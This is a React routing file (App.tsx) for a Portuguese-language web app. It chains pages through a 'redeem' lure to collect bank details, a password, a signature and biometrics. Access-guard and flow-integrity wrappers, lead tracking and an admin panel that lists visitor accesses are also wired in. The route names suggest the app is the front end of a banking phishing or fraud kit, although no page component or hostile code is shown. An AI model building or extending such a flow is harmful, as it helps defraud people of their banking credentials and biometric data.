import React from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import { FlowProvider } from "@/contexts/FlowContext";
import { AccessGuardProvider } from "@/contexts/AccessGuardContext";

class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean }
> {
  constructor(props: { children: React.ReactNode }) {
    super(props);
    this.state = { hasError: false };
  }
  static getDerivedStateFromError() {
    return { hasError: true };
  }
  componentDidCatch(error: unknown, info: React.ErrorInfo) {
    console.error("[ErrorBoundary]", error, info);
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="flex min-h-screen flex-col items-center justify-center bg-white px-6 text-center">
          <p className="text-lg font-bold text-foreground mb-2">Algo deu errado</p>
          <p className="text-sm text-muted-foreground mb-6">
            Tente recarregar a página. Se o problema persistir, entre em contato.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="rounded-full bg-primary px-6 py-3 text-sm font-semibold text-white"
          >
            Recarregar
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}
import { useLeadTracking } from "@/hooks/useLeadTracking";
import { useTracking } from "@/hooks/useTracking";
import ProtectedRoute from "@/components/ProtectedRoute";
import SplashPage from "./pages/SplashPage";
import InicioPage from "./pages/InicioPage";
import BankDataPage from "./pages/BankDataPage";
import RedeemPage from "./pages/RedeemPage";
import PasswordPage from "./pages/PasswordPage";
import SignaturePage from "./pages/SignaturePage";
import BiometryPage from "./pages/BiometryPage";
import CompletePage from "./pages/CompletePage";
import LottiePreview from "./pages/LottiePreview";
import NotFound from "./pages/NotFound";
import AdminLayout from "./pages/admin/AdminLayout";
import AdminDashboard from "./pages/admin/AdminDashboard";
import AdminAccessPage from "./pages/admin/AdminAccessPage";
import AdminAccessConfigPage from "./pages/admin/AdminAccessConfigPage";
import AdminFlowConfigPage from "./pages/admin/AdminFlowConfigPage";

const queryClient = new QueryClient();

function AppRoutes() {
  useLeadTracking();
  useTracking();

  return (
    <Routes>
      {/* Public flow — all protected by access guard + flow integrity */}
      <Route path="/" element={<ProtectedRoute><SplashPage /></ProtectedRoute>} />
      <Route path="/inicio" element={<ProtectedRoute><InicioPage /></ProtectedRoute>} />
      <Route path="/dados-bancarios" element={<ProtectedRoute stepKey="dados-bancarios"><BankDataPage /></ProtectedRoute>} />
      <Route path="/resgate" element={<ProtectedRoute stepKey="resgate"><RedeemPage /></ProtectedRoute>} />
      <Route path="/senha" element={<ProtectedRoute stepKey="senha"><PasswordPage /></ProtectedRoute>} />
      <Route path="/assinatura" element={<ProtectedRoute stepKey="assinatura"><SignaturePage /></ProtectedRoute>} />
      <Route path="/biometria" element={<ProtectedRoute stepKey="biometria"><BiometryPage /></ProtectedRoute>} />
      <Route path="/concluido" element={<ProtectedRoute stepKey="concluido"><CompletePage /></ProtectedRoute>} />
      <Route path="/lottie-preview" element={<LottiePreview />} />

      {/* Admin — protected by its own auth */}
      <Route path="/admin" element={<AdminLayout />}>
        <Route index element={<AdminDashboard />} />
        <Route path="acessos" element={<AdminAccessPage />} />
        <Route path="controle" element={<AdminAccessConfigPage />} />
        <Route path="fluxo" element={<AdminFlowConfigPage />} />
      </Route>

      <Route path="*" element={<NotFound />} />
    </Routes>
  );
}

const App = () => (
  <ErrorBoundary>
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        <FlowProvider>
          <BrowserRouter>
            <AccessGuardProvider>
              <ErrorBoundary>
                <AppRoutes />
              </ErrorBoundary>
            </AccessGuardProvider>
          </BrowserRouter>
        </FlowProvider>
      </TooltipProvider>
    </QueryClientProvider>
  </ErrorBoundary>
);

export default App;
